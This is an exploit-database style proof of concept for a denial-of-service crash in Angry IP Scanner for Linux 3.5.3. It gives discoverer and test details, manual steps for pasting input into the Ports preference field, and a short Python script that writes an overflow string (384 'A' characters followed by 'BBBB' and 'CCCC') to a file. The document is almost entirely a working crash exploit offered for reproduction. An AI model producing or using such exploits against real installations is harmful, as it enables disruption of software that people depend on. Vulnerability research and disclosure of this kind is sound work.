# Exploit Title: Angry IP Scanner for Linux 3.5.3 - Denial of Service (PoC)
# Discovery by: Mr Winst0n
# Discovery Date: 2018-12-22
# Vendor Homepage: https://angryip.org/
# Software Link : https://angryip.org/download/
# Tested Version: 3.5.3 (latest version)
# Tested on: Kali linux
# Vulnerability Type: Denial of Service (DoS)

# Steps to Produce the Crash:
# 1.- Run python code : python angryip.py
# 2.- Open Xangry.txt and copy content to clipboard
# 3.- Open Angry IP Scanner
# 4.- Go to "Tools" in toolbar, click on "Preferences", then in the tab "Ports",
# 5.- Paste ClipBoard on "Port selection", and click on "OK",
# 6.- Crashed

#!/usr/bin/env python

buffer = "\x41" * 384
crash = buffer + "BBBB" + "CCCC"
f = open("Xangry.txt", "w")
f.write(crash)
f.close()